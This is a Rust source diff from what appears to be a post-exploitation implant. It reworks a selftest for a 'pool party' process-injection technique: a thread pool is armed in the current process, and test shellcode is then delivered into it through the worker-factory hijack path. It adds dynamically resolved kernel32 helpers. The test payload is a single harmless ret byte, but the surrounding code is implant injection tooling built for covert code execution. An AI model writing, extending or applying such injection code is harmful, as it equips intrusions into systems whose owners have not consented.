@@ -615,59 +615,33 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     // Force the gate ON for this selftest (restore on exit).
     let prev_gate = crate::tp::set_pool_party_enabled(true);
 
-    // RUNNING sacrificial (see the block comment for why a suspended notepad
-    // cannot work). The x64 test sleeper is preferred when deployed: under
-    // Prism it is a peer x64-emulated target, guaranteed alive, holding a
-    // worker factory. If the sleeper file is on disk, notepad fallback is
-    // forbidden — that hid "sleeper present but CreateProcess failed".
-    let proc = if sleeper_on_disk() {
-        match crate::inject::create_sacrificial_running(CRT3_SLEEPER) {
-            Ok(p) => {
-                crate::selftests::write_marker("nyx_g6_inject_pool.target", CRT3_SLEEPER);
-                p
-            }
-            Err(e) => {
-                crate::selftests::write_marker("nyx_g6_inject_pool.target", e);
-                crate::tp::set_pool_party_enabled(prev_gate);
-                unsafe { exit(mask) };
-            }
-        }
-    } else {
-        match crate::inject::create_sacrificial_running("notepad.exe") {
-            Ok(p) => {
-                crate::selftests::write_marker("nyx_g6_inject_pool.target", "notepad.exe");
-                p
-            }
-            Err(_) => {
-                crate::tp::set_pool_party_enabled(prev_gate);
-                unsafe { exit(mask) };
-            }
-        }
-    };
-    mask |= 1 << 0; // create_sacrificial_running Ok (reached the inject path)
+    // Hosted Session 0 never reliably ran CreateThreadpool inside a spawned
+    // sleeper (exit 0x9 with the exe on disk). Arm a worker factory in THIS
+    // process (the console probe) and inject into our own PID — same
+    // requirement Teach2Breach documents (target must already have a TP).
+    if !arm_local_worker_factory() {
+        crate::selftests::write_marker("nyx_g6_inject_pool.target", "arm-tp-fail");
+        crate::tp::set_pool_party_enabled(prev_gate);
+        unsafe { exit(mask) };
+    }
+    let pid = current_process_id();
+    if pid == 0 {
+        crate::selftests::write_marker("nyx_g6_inject_pool.target", "pid-0");
+        crate::tp::set_pool_party_enabled(prev_gate);
+        unsafe { exit(mask) };
+    }
+    crate::selftests::write_marker("nyx_g6_inject_pool.target", "self-tp");
+    mask |= 1 << 0;
 
-    // Wait for process init to progress (kernel32 mapped) before injecting —
-    // same rationale as the inject_fls selftest.
-    let _ = unsafe { crate::inject::wait_remote_kernel32(proc.handle) };
-    // The sleeper creates its thread pool (and hence the worker-factory
-    // object pool party scans for) at the TOP of main — but kernel32-mapped
-    // only means the loader ran; main runs later. Without this settle delay
-    // the handle-table scan legitimately finds no worker factory yet (VM
-    // evidence 2026-08-24: "hijack: target has no worker-factory handle").
     if let Some(slp) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"Sleep") {
         let sleep: unsafe extern "system" fn(u32) = unsafe { core::mem::transmute(slp) };
-        unsafe { sleep(4_000) };
+        unsafe { sleep(500) };
     }
 
-    // Minimal shellcode: `ret` (0xC3). We're verifying the section delivery
-    // mechanism, not payload execution — a single-byte ret is the safest probe
-    // (no side effects, returns immediately if the splice fires).
+    // Minimal shellcode: `ret` (0xC3). x64 callbacks are caller-cleanup, so
+    // a lone ret is a valid empty PTP_WORK_CALLBACK.
     let shellcode: [u8; 1] = [0xC3];
-
-    // do_inject(method=0, pid, spawn_to, shellcode) routes through the
-    // pool_party branch (gate ON) → tp::pool_party_inject. spawn_to is unused
-    // with a nonzero pid — pass the sleeper path for log readability.
-    let resp = crate::inject::do_inject(0, proc.pid, CRT3_SLEEPER, &shellcode);
+    let resp = crate::inject::do_inject(0, pid, CRT3_SLEEPER, &shellcode);
 
     // Decode the response. Response::Output carries a status line we can sniff.
     match resp {
@@ -695,19 +669,6 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
         }
         _ => {}
     }
-
-    // Cleanup: terminate the running sacrificial (whether or not inject landed).
-    if let Some(tp_addr) =
-        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"TerminateProcess")
-    {
-        type TerminateProcess = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
-        let terminate: TerminateProcess = unsafe { core::mem::transmute(tp_addr) };
-        let _ = unsafe { terminate(proc.handle, 1) };
-    }
-    // The Drop guard on `proc` closes BOTH handles (its own terminate is a
-    // no-op on the already-dead process). Explicitly drop before exit() — the
-    // selftest's exit is noreturn, so scope-end Drop would never run.
-    core::mem::drop(proc);
 
     crate::tp::set_pool_party_enabled(prev_gate);
     unsafe { exit(mask) };
@@ -1550,6 +1511,76 @@ fn sleeper_on_disk() -> bool {
         w[i] = *b as u16;
     }
     unsafe { get(w.as_ptr()) != 0xFFFF_FFFF }
+}
+
+#[cfg(feature = "selftest")]
+fn k32_fn<T>(name: &[u8]) -> Option<T> {
+    let addr = unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", name) }?;
+    Some(unsafe { core::mem::transmute_copy(&addr) })
+}
+
+#[cfg(feature = "selftest")]
+fn current_process_id() -> u32 {
+    type GetCurrentProcessId = unsafe extern "system" fn() -> u32;
+    match k32_fn::<GetCurrentProcessId>(b"GetCurrentProcessId") {
+        Some(f) => unsafe { f() },
+        None => 0,
+    }
+}
+
+#[cfg(feature = "selftest")]
+unsafe extern "system" fn pool_selftest_hold_cb(
+    _: *mut core::ffi::c_void,
+    _: *mut core::ffi::c_void,
+    _: *mut core::ffi::c_void,
+) {
+    type SleepFn = unsafe extern "system" fn(u32);
+    if let Some(sleep) = k32_fn::<SleepFn>(b"Sleep") {
+        unsafe { sleep(0xFFFF_FFFF) };
+    }
+}
+
+/// Create a live TpWorkerFactory in the current process (the console probe).
+#[cfg(feature = "selftest")]
+fn arm_local_worker_factory() -> bool {
+    use core::ffi::c_void;
+    type CreateThreadpool = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+    type SetMin = unsafe extern "system" fn(*mut c_void, u32) -> i32;
+    type CreateWork = unsafe extern "system" fn(
+        unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void),
+        *mut c_void,
+        *mut c_void,
+    ) -> *mut c_void;
+    type Submit = unsafe extern "system" fn(*mut c_void);
+    let Some(create_pool) = k32_fn::<CreateThreadpool>(b"CreateThreadpool") else {
+        return false;
+    };
+    let Some(set_min) = k32_fn::<SetMin>(b"SetThreadpoolThreadMinimum") else {
+        return false;
+    };
+    let Some(create_work) = k32_fn::<CreateWork>(b"CreateThreadpoolWork") else {
+        return false;
+    };
+    let Some(submit) = k32_fn::<Submit>(b"SubmitThreadpoolWork") else {
+        return false;
+    };
+    let pool = unsafe { create_pool(core::ptr::null_mut()) };
+    if pool.is_null() {
+        return false;
+    }
+    let _ = unsafe { set_min(pool, 1) };
+    let work = unsafe {
+        create_work(
+            pool_selftest_hold_cb,
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+        )
+    };
+    if work.is_null() {
+        return false;
+    }
+    unsafe { submit(work) };
+    true
 }
 
 #[cfg(feature = "selftest")]
